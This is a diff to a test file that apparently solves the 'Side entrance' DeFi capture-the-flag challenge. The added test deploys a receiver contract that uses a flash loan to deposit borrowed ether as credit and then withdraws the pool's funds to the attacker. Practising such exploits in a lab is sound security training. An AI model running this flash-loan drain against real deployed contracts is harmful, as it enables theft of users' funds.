@@ -25,6 +25,16 @@ describe("[Challenge] Side entrance", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // deposit using funds from flashloan to establish credits, then withdraw
+        const receiverFactory = await ethers.getContractFactory(
+            "contracts/side-entrance/FlashLoanEtherReceiver.sol:FlashLoanEtherReceiver",
+            deployer,
+        )
+        const receiverContract = await receiverFactory.deploy(this.pool.address)
+
+        await receiverContract.goFlash(ETHER_IN_POOL)
+        await receiverContract.goWithdraw(attacker.address)
     })
 
     after(async function () {
